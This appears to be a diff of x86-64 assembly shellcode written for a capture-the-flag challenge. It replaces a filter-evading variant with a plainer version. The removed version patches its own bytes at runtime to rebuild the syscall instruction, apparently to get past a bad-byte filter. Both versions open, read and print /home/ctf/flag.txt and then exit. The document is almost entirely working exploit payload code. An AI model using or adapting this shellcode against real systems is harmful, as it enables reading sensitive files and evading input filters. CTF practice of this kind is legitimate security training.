@@ -1,70 +1,36 @@
 bits 64
 
-  jmp short bottom
+;;; OPEN
 
-top:
-  pop rdi
+  mov rax, 2 ; Syscall 2 = sys_open
+  call getfilename ; Pushes the next address onto the stack and jumps down
+  db "/home/ctf/flag.txt",0 ; The literal flag, null terminated
+getfilename:
+  pop rdi ; Pop the top of the stack (which is the filename) into rdi
+  mov rsi, 0 ; Flags = 0
+  mov rdx, 0 ; Mode = 0
+  syscall ; Perform sys_open() syscall, the file handle is returned in rax
 
-  ; Save the address for later
-  mov rbx, rdi
+;;; READ
 
-  ; Increment the 'syscall' bytes
-  inc byte [rdi] ; 0x0e -> 0x0f
-  inc rdi
+  push rdi ; Temporarly store the filename pointer
+  push rax ; Temporarily store the handle
 
-  inc byte [rdi] ; 0x04 -> 0x05
-  inc rdi
+  mov rax, 0 ; Syscall 0 = sys_read
+  pop rdi ; Move the file handle into rdi
+  pop rsi ; Use the same buffer where the filename pointer is stored (it's readable and writable)
+  mov rdx, 30 ; rdx is the count
+  syscall ; Perform sys_read() syscall, reading from the opened file
 
-  inc rdi
+;;; WRITE
 
-  ; sys_open rax=2 rdi=filename rsi=flags rdx=mode
-  xor rax, rax
-  inc rax
-  inc rax ; sys_open
+  mov rax, 1 ; Syscall 1 = sys_write
+  mov rdi, 1 ; File handle to write to = stdout = 1
+  ; (rsi is already the buffer)
+  mov rdx, 30 ; rdx is the count again
+  syscall ; Perform the sys_write syscall, writing the data to stdout
 
-  ; mov rdi, rdi ; filename
-
-  xor rsi, rsi ; flags
-  xor rdx, rdx ; mode
-  ;syscall
-  call rbx
-
-  ; sys_read rax=0 rdi=fd rsi=buf rdx=count
-  mov rsi, rdi ; buf (overwrite the filename)
-  mov rdi, rax ; fd
-  xor rax, rax ; sys_read
-  xor rdx, rdx
-  mov dl, 64
-  ;syscall
-  call rbx
-
-  ;; sys_write rax=1 rdi=fd rsi=buf rdx=count
-  mov rdx, rax ; count
-  ; mov rsi, rsi ; buf already correct
-  xor rax, rax
-  inc rax ; sys_write
-
-  xor rdi, rdi
-  inc rdi ; fd = stdout
-  ;syscall
-  call rbx
-
-
-  ; xor rax, rax
-  ; inc rax
-  ; xor rdi, rdi
-  ; inc rdi
-  ; xor rdx, rdx
-  ; mov dl, 12
-  ; syscall
-
-  xor rax, rax
-  mov al, 60
-  xor rdi, rdi
-  ;syscall
-  call rbx
-
-bottom:
-  call top
-
-db 0x0E, 0x04, 0xc3, "/home/ctf/flag.txt"
+;;; EXIT
+  mov rax, 60 ; Syscall 60 = exit
+  mov rdi, 0 ; Exit with code 0
+  syscall ; Perform an exit
